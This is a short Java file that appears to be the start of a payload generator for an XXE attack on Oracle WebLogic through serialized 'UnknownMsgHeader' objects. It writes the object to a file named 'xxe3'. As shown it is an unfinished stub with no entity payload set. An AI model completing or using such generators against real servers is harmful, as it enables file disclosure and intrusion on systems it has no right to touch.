import org.w3c.dom.Element;
import weblogic.wsee.message.UnknownMsgHeader;

import javax.xml.namespace.QName;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;

public class weblogicxxe3 {
    public static void main(String[] args) throws IOException {
        Object instance = getXXEObject();
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("xxe3"));
        out.writeObject(instance);
        out.flush();
        out.close();
    }

    public static Object getXXEObject() {
        //QName qname = new QName("a", "b", "c");
        UnknownMsgHeader umh = new UnknownMsgHeader();



        return umh;
    }
}
